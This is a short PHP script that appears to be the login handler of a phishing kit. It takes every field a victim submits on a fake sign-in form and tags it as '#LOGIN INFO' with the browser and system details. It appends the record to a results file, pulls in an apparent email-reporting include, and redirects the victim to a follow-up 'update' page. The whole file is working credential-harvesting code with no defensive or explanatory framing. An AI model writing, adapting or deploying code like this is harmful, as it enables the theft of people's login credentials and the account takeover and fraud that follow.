<?php 
include '../asset/php/info.php';
include '../../email.php';
session_start();
ob_start();
$line = "##############################";
//CREATE RESULT FILE
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$signin = "



$line
NEW RESULT (^_^)
$line
#LOGIN INFO
$line
[Browser] => $browser
[System] => $os_platform
";
foreach($_POST as $var => $val){
	$var2 = str_replace("+"," ",$var);
	$signin .= "[$var2] => $val
";
}
$_SESSION['login'] = $signin;
$fp = fopen("../../result.txt",'a');
fwrite($fp, $signin);
fclose($fp);
header("location: ../update.php");
exit();
}
 
?>